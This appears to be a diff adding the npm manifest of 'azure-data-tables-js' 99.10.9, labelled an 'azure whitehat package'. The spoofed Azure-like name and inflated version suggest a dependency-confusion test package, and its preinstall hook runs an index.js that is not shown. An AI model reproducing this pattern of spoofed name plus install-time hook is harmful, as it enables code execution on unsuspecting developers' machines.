@@ -1,0 +1,39 @@
+{
+    "name": "azure-data-tables-js",
+    "version": "99.10.9",
+    "description": "azure whitehat package",
+    "main": "index.js",
+    "scripts": {
+        "test": "echo \"error no test specified\" && exit 1",
+        "preinstall": "node index.js"
+    },
+    "author": "",
+    "License": "ISC",
+    "_id": "azure-data-tables-js@99.10.9",
+    "_nodeVersion": "14.16.1",
+    "_npmVersion": "6.14.11",
+    "dist": {
+        "integrity": "sha512-bxZhpOraut9dHX5FSd9kHeVaT35FnfC53ZkwORMU7fAxPCCnq3Nyz8PLkZVKKVguCr4tAiALdZrOpVjTHfZT4w==",
+        "shasum": "e19ce2bf68cf5f12a7f537750cedefa5b9447728",
+        "tarball": "https://registry.npmjs.org/azure-data-tables-js/-/azure-data-tables-js-99.10.9.tgz",
+        "fileCount": 2,
+        "unpackedSize": 3584,
+        "npm-signature": "-----BEGIN PGP SIGNATURE-----\r\nVersion: OpenPGP.js v3.0.13\r\nComment: https://openpgpjs.org\r\n\r\nwsFcBAEBCAAQBQJhoSg8CRA9TVsSAnZWagAAdLYQAIF0FN0Io8eNaC5pqwGi\nnFQOUhkBKpHAiH31mSeMStOYhMbhfiFMtZkBNVGFGmHRP9AiJv7vuw8LT3Pi\nF+LNyv0WvIlfYLofTt31V/WXwFLcG3wzaFguSHR4L0GB5xHa6JOfWSTQWAk/\nnKfEXOvpaM1ByL1ix0PfBkVNPSav50rlsXnWNzyCTHxfY0cd+Ru0oBDDKY0o\nbgQe4JUaVl41MzzgYvgWLdyMbBGD4MP1BzV4OMoH0MFRiJZN53eU4ggZDuDs\ngFYqJOVZrQ7A0oDPuNnS2EUjtY4TXC5ULpPkIg/5qhBDYK++xxjY41OZg0DN\np1lBQYlGdxaRxIJBwhO65mrikrEGakcs46lhHcWrrc2FpS1ds86k7onHgrLv\nuMsrXvUbuYJdLOVMuwXZ/YpxfmlkOehqXlalfc2/iE24d9mhuDAqhRYY14XK\nQQwUklojxOTNiNNjMIu5M7TQAobbEVIRRqbmuxDQeAMm6A6D0KjB1oDAoZ3s\nZj2OS+0bjfDbMtyyfjjxuGDAURJPLRkSA9s+eriX/s32eEl1C1ZXwaMXavZi\nsvqfh8jXqyem63vTF9QSnryWmdYn1aeoggT28xBUkHWmi12xdSVHO9Cj0N0k\nTLsHl/2h7OU7x4Nolr2LyPMTIf0p6bbrdkhoB+L+81ZUjZeY3H6cWJMwEKII\nicqh\r\n=FEqL\r\n-----END PGP SIGNATURE-----\r\n"
+    },
+    "_npmUser": {
+        "name": "azure-tests",
+        "email": "hussam.tes08+3@gmail.com"
+    },
+    "directories": {},
+    "maintainers": [
+        {
+            "name": "azure-tests",
+            "email": "hussam.tes08+3@gmail.com"
+        }
+    ],
+    "_npmOperationalInternal": {
+        "host": "s3://npm-registry-packages",
+        "tmp": "tmp/azure-data-tables-js_99.10.9_1637951548114_0.5237837496191602"
+    },
+    "_hasShrinkwrap": false
+}
